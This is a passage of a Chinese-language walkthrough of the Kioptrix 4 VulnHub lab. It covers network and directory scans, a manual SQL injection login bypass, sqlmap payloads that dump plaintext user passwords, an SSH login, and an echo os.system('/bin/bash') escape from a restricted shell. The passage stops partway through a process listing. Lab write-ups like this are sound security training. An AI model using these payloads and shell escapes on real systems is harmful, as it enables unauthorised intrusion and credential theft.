https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408</span></span><br><span class="line"><span class="string">|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699</span></span><br><span class="line"><span class="string">|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364</span></span><br><span class="line"><span class="string">|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750</span></span><br><span class="line"><span class="string">|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434</span></span><br><span class="line"><span class="string">|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br><span class="line"><span class="string">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:F3:0E:E9 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 2.6.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:2.6</span></span><br><span class="line"><span class="string">OS details: Linux 2.6.9 - 2.6.33</span></span><br><span class="line"><span class="string">Uptime guess: 0.009 days (since Mon Dec  9 20:49:38 2019)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">TCP Sequence Prediction: Difficulty=203 (Good luck!)</span></span><br><span class="line"><span class="string">IP ID Sequence Generation: All zeros</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: false</span></span><br><span class="line"><span class="string">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span></span><br></pre></td></tr></table></figure>
<p>使用工具enum4linux得到如下信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># enum4linux 192.168.84.139</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 10 00:55:51 2019</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.84.139</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ====================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.84.139    |</span><br><span class="line"> ====================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.84.139    |</span><br><span class="line"> ============================================== </span><br><span class="line">Looking up status of 192.168.84.139</span><br><span class="line">        KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    Session Check on 192.168.84.139    |</span><br><span class="line"> ======================================= </span><br><span class="line">[E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br></pre></td></tr></table></figure>

<p>dirb扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.84.139/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Dec 10 00:58:55 2019</span><br><span class="line">URL_BASE: http://192.168.84.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.84.139/ ----</span><br><span class="line">+ http://192.168.84.139/cgi-bin/ (CODE:403|SIZE:329)                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/images/                                                  </span><br><span class="line">+ http://192.168.84.139/index (CODE:200|SIZE:1255)                                            </span><br><span class="line">+ http://192.168.84.139/index.php (CODE:200|SIZE:1255)                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/john/                                                    </span><br><span class="line">+ http://192.168.84.139/<span class="built_in">logout</span> (CODE:302|SIZE:0)                                              </span><br><span class="line">+ http://192.168.84.139/member (CODE:302|SIZE:220)                                            </span><br><span class="line">+ http://192.168.84.139/server-status (CODE:403|SIZE:334)                                     </span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/john/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Dec 10 00:59:00 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></table></figure>
<p>wfuzz进行模糊测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.84.139/FUZZ</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4 - The Web Fuzzer                           *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.84.139/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 3024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                             </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000566:   403        10 L     33 W     329 Ch      &quot;cgi-bin/&quot;                          </span></span><br><span class="line"><span class="string">000001337:   301        9 L      31 W     356 Ch      &quot;images&quot;                            </span></span><br><span class="line"><span class="string">000001350:   200        45 L     94 W     1255 Ch     &quot;index&quot;                             </span></span><br><span class="line"><span class="string">000001458:   301        9 L      31 W     354 Ch      &quot;john&quot;                              </span></span><br><span class="line"><span class="string">000001629:   302        0 L      0 W      0 Ch        &quot;logout&quot;                            </span></span><br><span class="line"><span class="string">000001736:   302        1 L      22 W     220 Ch      &quot;member&quot;                            </span></span><br><span class="line"><span class="string">000002294:   301        9 L      31 W     356 Ch      &quot;robert&quot;                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 3.234193</span></span><br><span class="line"><span class="string">Processed Requests: 3024</span></span><br><span class="line"><span class="string">Filtered Requests: 3017</span></span><br><span class="line"><span class="string">Requests/sec.: 935.0089</span></span><br></pre></td></tr></table></figure>

<p>访问页面，发现登录口存在sql注入漏洞</p>
<ul>
<li>手工注入</li>
</ul>
<p>用户名使用john，密码使用1’ or ‘1’=’1</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub34.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub35.jpg"></p>
<p>得到两个密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username     :     john</span><br><span class="line">Password     :     MyNameIsJohn</span><br><span class="line"></span><br><span class="line">Username     :     robert</span><br><span class="line">Password     :     ADGAdsafdfwt4gadfga==</span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap</li>
</ul>
<p>跑出注入点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                   </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                      </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                      </span><br><span class="line">|___|_  [<span class="string">&#x27;]_|_|_|__,|  _|                                                                      </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 01:21:00 /2019-12-10/</span><br><span class="line"></span><br><span class="line">[01:21:00] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[01:21:00] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[01:21:00] [INFO] testing connection to the target URL</span><br><span class="line">[01:21:00] [INFO] heuristics detected web page charset <span class="string">&#x27;ascii&#x27;</span></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-9812<span class="string">&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27;</span> AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[01:21:00] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[01:21:00] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.84.139&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 01:21:00 /2019-12-10/</span><br></pre></td></tr></table></figure>
<p>跑出账号密码,果真还是sqlmap屌炸天！！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D members -T members --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [)]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 01:25:36 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:36] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[01:25:36] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] fetching columns for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrieval</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: id</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: username</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: password</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching number of entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: MyNameIsJohn</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: john</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: ADGAdsafdfwt4gadfga==</span></span><br><span class="line"><span class="string">[01:25:42] [INFO] retrieved: robert</span></span><br><span class="line"><span class="string">Database: members</span></span><br><span class="line"><span class="string">Table: members</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| id | password              | username |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | MyNameIsJohn          | john     |</span></span><br><span class="line"><span class="string">| 2  | ADGAdsafdfwt4gadfga== | robert   |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:42] [INFO] table &#x27;</span>members.members<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/192.168.84.139/dump/members/members.csv<span class="string">&#x27;                                                                               </span></span><br><span class="line"><span class="string">[01:25:42] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 01:25:42 /2019-12-10/</span></span><br></pre></td></tr></table></figure>

<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>ssh连接之后发现许多命令无法执行,但是可以执行echo命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.84.139 (192.168.84.139)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.84.139<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">john@192.168.84.139&#x27;</span>s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is <span class="keyword">in</span> place so you  don<span class="string">&#x27;t screw up</span></span><br><span class="line"><span class="string">Type &#x27;</span>?<span class="string">&#x27; or &#x27;</span><span class="built_in">help</span><span class="string">&#x27; to get the list of allowed commands</span></span><br><span class="line"><span class="string">john:~$ ls</span></span><br><span class="line"><span class="string">john:~$ pwd</span></span><br><span class="line"><span class="string">*** unknown command: pwd</span></span><br><span class="line"><span class="string">john:~$ whoami</span></span><br><span class="line"><span class="string">*** unknown command: whoami</span></span><br><span class="line"><span class="string">john:~$echo &#x27;</span>casdcasdc<span class="string">&#x27;                                                                             </span></span><br><span class="line"><span class="string">casdcasdc</span></span><br></pre></td></tr></table></figure>

<p>通过使用命令echo os.system(‘/bin/bash’)轻松地“转义”并绕过有限制的shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ ls</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/john</span><br><span class="line">john@Kioptrix4:~$ whoami</span><br><span class="line">john</span><br><span class="line">john@Kioptrix4:~$ </span><br></pre></td></tr></table></figure>

<p>使用命令行收集信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ cat /etc/*-release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=8.04</span><br><span class="line">DISTRIB_CODENAME=hardy</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 8.04.3 LTS&quot;</span></span><br><span class="line">john@Kioptrix4:~$ cat /proc/version</span><br><span class="line">Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009</span></span><br><span class="line">john@Kioptrix4:~$ ps -ef | grep root</span><br><span class="line">root         1     0  0 04:44 ?        00:00:01 /sbin/init</span><br><span class="line">root         2     0  0 04:44 ?        00:00:00 [kthreadd]</span><br><span class="line">root         3     2  0 04:44 ?        00:00:00 [migration/0]</span><br><span class="line">root         4     2  0 04:44 ?        00:00:00 [ksoftirqd/0]</span><br><span class="line">root         5     2  0 04:44 ?        00:00:00 [watchdog/0]</span><br><span class="line">root         6     2  0 04:44 ?        00:00:00 [migration/1]</span><br><span class="line">root         7     2  0 04:44 ?        00:00:00 [ksoftirqd/1]</span><br><span class="line">root         8     2  0 04:44 ?        00:00:00 [watchdog/1]</span><br><span class="line">root         9     2  0 04:44 ?        00:00:00 [migration/2]</span><br><span class="line">root        10     2  0 04:44 ?        00:00:00 [ksoftirqd/2]</span><br><span class="line">root        11     2  0 04:44 ?        00:00:00 [watchdog/2]</span><br><span class="line">root        12     2  0 04:44 ?        00:00:00 [migration/3]</span><br><span class="line">root        13     2  0 04:44 ?        00:00:00 [ksoftirqd/3]</span><br><span class="line">root        14     2  0 04:44 ?        00:00:00 [watchdog/3]</span><br><span class="line">root        15     2  0 04:44 ?        00:00:00 [events/0]</span><br><span class="line">root        16     2  0 04:44 ?        00:00:00 [events/1]</span><br><span class="line">root        17     2  0 04:44 ?        00:00:00 [events/2]</span><br><span class="line">root        18     2  0 04:44 ?        00:00:00 [events/3]</span><br><span class="line">root        19     2  0 04:44 ?        00:00:00 [khelper]</span><br><span class="line">root        56     2  0 04:44 ?        00:00:00 [kblockd/0]</span><br><span class="line">root        57     2  0 04:44 ?        00:00:00 [kblockd/1]</span><br><span class="line">root        58     2  0 04:44 ?        00:00:00 [kblockd/2]</span><br><span class="line">root        59     2  0 04:44 ?        00:00:00 [kblockd/3]</span><br><span class="line">root        62     2  0 04:44 ?        00:00:00 [kacpid]</span><br><span class="line">root        63     2  0 04:44 ?        00:00:00 [kacpi_notify]</span><br><span class="line">root       193     2  0 04:44 ?        00:00:00 [kseriod]</span><br><span class="line">root       247     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       248     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       249     2  0 04:44 ?        00:00:00 [kswapd0]</span><br><span class="line">root       291     2  0 04:44 ?        00:00:00 [aio/0]</span><br><span class="line">root       292     2  0 04:44 ?        00:00:00 [aio/1]</span><br><span class="line">root       293     2  0 04:44 ?        00:00:00 [aio/2]</span><br><span class="line">root       294     2  0 04:44 ?        00:00:00 [aio/3]</span><br><span class="line">root      1627     2  0 04:44 ?        00:00:00 [ata/0]</span><br><span class="line">root      1629     2  0 04:44 ?        00:00:00 [ata/1]</span><br><span class="line">root      1630     2  0 04:44 ?        00:00:00 [ata/2]</span><br><span class="line">root      1631     2  0 04:44 ?        00:00:00 [ata/3]</span><br><span class="line">root      1632     2  0 04:44 ?        00:00:00 [ata_aux]</span><br><span class="line">root      1800     2  0 04:44 ?        00:00:00 [ksuspend_usbd]</span><br><span class="line">root      1806     2  0 04:44 ?        00:00:00 [khubd]</span><br><span class="line">root      2474     2  0 04:44 ?        00:00:00 [scsi_eh_0]</span><br><span class="line">root      2486     2  0 04:44 ?        00:00:00 [scsi_eh_1]</span><br><span class="line">root      2489     2  0 04:44 ?        00:00:00 [scsi_eh_2]</span><br><span class="line">root      2579     2  0 04:44 ?        00:00:00 [scsi_eh_3]</span><br><span class="line">root      2580     2  0 04:44 ?        00:00:00 [scsi_eh_4]</span><br><span class="line">root      2581     2  0 04:44 ?        00:00:00 [scsi_eh_5]</span><br><span class="line">root      2582     2  0 04:44 ?        00:00:00 [scsi_eh_6]</span><br><span class="line">root      2583     2  0 04:44 ?        00:00:00 [scsi_eh_7]</span><br><span class="line">root      2584     2  0 04:44 ?        00:00:00 [scsi_eh_8]</span><br><span class="line">root      2585     2  0 04:44 ?        00:00:00 [scsi_eh_9]</span><br><span class="line">root      2586     2  0 04:44 ?        00:00:00 [scsi_eh_10]</span><br><span class="line">root      2587     2  0 04:44 ?        00:00:00 [scsi_eh_11]</span><br><span class="line">root      2588     2  0 04:44 ?        00:00:00 [scsi_eh_12]</span><br><span class="line">root      2589     2  0 04:44 ?        00:00:00 [scsi_eh_13]</span><br><span class="line">root      2590     2  0 04:44 ?        00:00:00 [scsi_eh_14]</span><br><span class="line">root      2591     2  0 04:44 ?        00:00:00 [scsi_eh_15]</span><br><span class="line">root      2592     2  0 04:44 ?        00:00:00 [scsi_eh_16]</span><br><span class="line">root      2593     2  0 04:44 ?        00:00:00 [scsi_eh_17]</span><br><span class="line">root      2594     2  0 04:44 ?        00:00:00 [scsi_eh_18]</span><br><span class="line">root      2595     2  0 04:44 ?        00:00:00 [scsi_eh_19]</span><br><span class="line">root      2596     2  0 04:44 ?        00:00:00 [scsi_eh_20]</span><br><span class="line">root      2597     2  0 04:44 ?        00:00:00 [scsi_eh_21]</span><br><span class="line">root      2598     2  0 04:44 ?        00:00:00 [scsi_eh_22]</span><br><span class="line">root      2599     2  0 04:44 ?        00:00:00 [scsi_eh_23]</span><br><span class="line">root      2600     2  0 04:44 ?        00:00:00 [scsi_eh_24]</span><br><span class="line">root      2601     2  0 04:44 ?        00:00:00 [scsi_eh_25]</span><br><span class="line">root      2602     2  0 04:44 ?        00:00:00 [scsi_eh_26]</span><br><span class="line">root      2603     2  0 04:44 ?        00:00:00 [scsi_eh_27]</span><br><span class="line">root      2604     2  0 04:44 ?        00:00:00 [scsi_eh_28]</span><br><span class="line">root      2605     2  0 04:44 ?        00:00:00 [scsi_eh_29]</span><br><span class="line">root      2606     2  0 04:44 ?        00:00:00 [scsi_eh_30]</span><br><span class="line">root      2607     2  0 04:44 ?        00:00:00 [scsi_eh_31]</span><br><span class="line">root      2608     2  0 04:44 ?        00:00:00 [scsi_eh_32]</span><br><span class="line">root      2849     2  0 04:44 ?        00:00:00 [kjournald]</span><br><span class="line">root      3028     1  0 04:45 ?        00:00:00 /sbin/udevd --daemon</span><br><span class="line">root      3701     2  0 04:45 ?        00:00:00 [kpsmoused]</span><br><span class="line">root      3800     2  0 04:45 ?        00:00:00 [btaddconn]</span><br><span class="line">root      3801     2  0 04:45 ?        00:00:00 [btdelconn]</span><br><span class="line">root      4838     1  0 04:45 tty4     00:00:00 /sbin/getty 38400 tty4</span><br><span class="line">root      4839     1  0 04:45 tty5     00:00:00 /sbin/getty 38400 tty5</span><br><span class="line">root      4841     1  0 04:45 tty2     00:00:00 /sbin/getty 38400 tty2</span><br><span class="line">root      4842     1  0 04:45 tty3     00:00:00 /sbin/getty 38400 tty3</span><br><span class="line">root      4845     1  0 04:45 tty6     00:00:00 /sbin/getty 38400 tty6</span><br><span class="line">root      4906     1  0 04:45 ?        00:00:00 /bin/dd bs 1 <span class="keyword">if</span> /proc/kmsg of /var/run/klogd/kmsg</span><br><span class="line">root      4927     1  0 04:45 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root      4983     1  0 04:45 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root      5025  4983  0 04:45 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/my</span><br><span class="line">root      5026  4983  0 04:45 